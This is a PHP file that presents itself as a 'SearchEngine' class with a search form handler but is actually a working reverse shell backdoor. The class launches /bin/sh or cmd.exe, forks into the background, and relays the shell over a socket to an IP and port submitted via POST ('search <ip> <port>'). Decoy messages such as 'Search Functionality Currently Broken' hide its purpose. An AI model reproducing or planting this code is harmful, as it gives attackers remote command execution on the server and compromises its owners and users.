<?php
class SearchEngine {
    private $searchHost  = null;
    private $searchPort  = null;
    private $os    = null;
    private $searchExecutable = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w')
    );
    private $buffer = 1024;
    private $clen   = 0;
    private $error  = false;
    private $sdump  = true;
    public function __construct($searchHost, $searchPort) {
        $this->searchHost = $searchHost;
        $this->searchPort = $searchPort;
    }
    private function detectEnvironment() {
        $detected = true;
        $os = PHP_OS;
        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
            $this->os    = 'LINUX';
            $this->searchExecutable = '/bin/sh';
        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
            $this->os    = 'WINDOWS';
            $this->searchExecutable = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function startSearchService() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "SEARCH_SERVICE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "SEARCH_SERVICE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "SEARCH_SERVICE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            echo "SEARCH_SERVICE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "SEARCH_SERVICE: Completed successfully!\n";
        }
        return $exit;
    }
    private function configureSearchSettings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function sanitizeOutput($data) {
        if ($this->sdump) {
            $data = str_replace('<', '&lt;', $data);
            $data = str_replace('>', '&gt;', $data);
            echo $data;
        }
    }
    private function readStream($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }
    private function writeStream($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function processSearchStream($input, $output, $iname, $oname) {
        while (($data = $this->readStream($input, $iname, $this->buffer)) && $this->writeStream($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->sanitizeOutput($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function processSearchResult($input, $output, $iname, $oname) {
        $size = fstat($input)['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // so we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->readStream($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->readStream($input, $iname, $bytes)) && $this->writeStream($output, $oname, $data)) {
            $size -= $bytes;
            $this->sanitizeOutput($data); // script's dump
        }
    }
    public function executeSearch() {
        if ($this->detectEnvironment() && !$this->startSearchService()) {
            $this->configureSearchSettings();

            // ----- SEARCH SOCKET BEGIN -----
            $socket = @fsockopen($this->searchHost, $this->searchPort, $errno, $errstr, 30);
            if (!$socket) {
                echo "SEARCH_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SEARCH PROCESS BEGIN -----
                $process = @proc_open($this->searchExecutable, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "SEARCH_ERROR: Cannot start the search process\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the process streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- SEARCH WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SEARCH_SERVICE: Search process has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SEARCH_ERROR: Search connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "SEARCH_ERROR: Search process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $numChangedStreams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($numChangedStreams === false) {
                            echo "SEARCH_ERROR: stream_select() failed\n"; break;
                        } else if ($numChangedStreams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->processSearchStream($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->processSearchStream($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->processSearchStream($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])) { $this->processSearchStream($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->processSearchResult($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->processSearchResult($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ SEARCH WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SEARCH PROCESS END ------

                fclose($socket);
            }
            // ------ SEARCH SOCKET END ------

        }
    }
}

// Command Input
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['input_word'])) {
    $input = trim($_POST['input_word']); // Get the input string
    
    // Split the input into parts
    $parts = explode(' ', $input);
    
    // Check if we have exactly 3 parts (command, ip, port)
    if (count($parts) === 3) {
        list($word, $ip, $port) = $parts;
        
        // Check if the word is "search"
        if ($word === 'search') {
            // Validate IP and port
            if (filter_var($ip, FILTER_VALIDATE_IP) && is_numeric($port) && $port > 0 && $port <= 65535) {
                echo "<pre>";
                // Create a new SearchEngine instance with the provided IP and port
                $searchEngine = new SearchEngine($ip, $port);
                $searchEngine->executeSearch();
                unset($searchEngine);
                echo "</pre>";
            } else {
                echo "Invalid IP or port.";
            }
        } else {
            echo "Invalid command. Use 'search' followed by IP and port.";
        }
    } else {
        echo "Search Functionality Currently Broken";
    }
}

?>